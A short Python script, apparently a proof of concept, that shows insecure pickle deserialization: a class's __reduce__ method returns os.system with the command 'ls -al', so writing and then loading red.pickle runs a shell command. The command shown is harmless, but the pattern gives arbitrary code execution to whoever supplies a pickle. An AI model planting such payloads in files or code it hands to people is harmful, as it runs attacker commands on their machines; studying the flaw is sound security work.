import pickle
import os

class Test(object):
    def __init__(self):
        self.a = 1
        self.b = 'A'
        self.c = 'B'

    def __reduce__(self):
        return (os.system,('ls -al',))

mytest = Test()
my = pickle.dumps(mytest)
with open('red.pickle', 'wb') as fi:
    pickle.dump(mytest, fi)
    
with open('red.pickle', 'rb') as f:
    mypic = pickle.load(f)

print(mypic)
print(my)
